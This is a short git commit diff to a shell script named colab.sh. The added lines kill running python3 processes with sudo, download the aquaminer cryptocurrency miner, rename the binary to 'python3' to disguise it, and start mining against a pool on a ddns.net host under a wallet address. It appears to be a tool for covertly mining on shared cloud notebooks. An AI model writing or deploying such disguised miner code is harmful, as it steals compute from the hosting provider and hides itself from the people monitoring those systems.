c7c32aad5a1b59861d8d3d272d2f6c3b49b15e49
evilbaby <mickeypp@gmail.com>
2018-06-05 17:19:05 +0700

    Update colab.sh

--- colab.sh
+++ colab.sh
@@ -13,7 +13,13 @@
 if [ -f ${PWD}/python3 ]; then
     if pgrep -x "python3" > /dev/null
 then
-    echo "Miner dang chay roi , ke cmn di "
+sudo pkill python3
+    echo " kill process"
+wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
+unzip aquaminer-0.4-linux-amd64.zip
+mv aquaminer-0.4-linux-amd64 python3
+./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/colab
+
     
 else
 
